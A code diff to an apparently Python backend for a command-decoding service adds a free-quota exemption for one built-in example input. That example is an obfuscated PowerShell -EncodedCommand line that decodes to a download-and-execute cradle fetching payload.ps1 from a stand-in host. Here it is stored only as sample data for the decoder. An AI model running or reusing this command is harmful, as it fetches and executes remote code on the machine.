@@ -5,6 +5,9 @@ from typing import Optional, Dict, Any
 from datetime import datetime, timedelta
 from services.session_manager import get_supabase_client
 
+# ✅ Example command that doesn't count towards quota
+EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA" -noExit'
+
 
 async def check_session_rate_limit_from_db(
     session_id: str,
@@ -154,17 +157,30 @@ async def get_user_plan_features(user_id: str) -> Dict[str, Any]:
         }
 
 
-async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[str] = None) -> dict:
+async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[str] = None, command: Optional[str] = None) -> dict:
     """
     Check if user has permission to decode commands
     
     Args:
         user_id: User ID to check (None for anonymous)
         session_id: Session ID for anonymous users
+        command: Optional command to check if it's the example (won't count towards quota)
         
     Returns:
         Dictionary with decode permission and usage details
     """
+    
+    # ✅ If this is the example command, always allow decode without counting
+    if command and command.strip() == EXAMPLE_ENCODED_COMMAND.strip():
+        print(f"[DECODE CHECK] 🎯 EXAMPLE COMMAND DETECTED - Free decode granted!")
+        return {
+            "can_decode": True,
+            "current_usage": 0,
+            "limit": None,
+            "remaining": None,
+            "seconds_until_reset": None,
+            "is_example": True
+        }
     # For authenticated users, fetch their plan
     if user_id:
         plan_features = await get_user_plan_features(user_id)
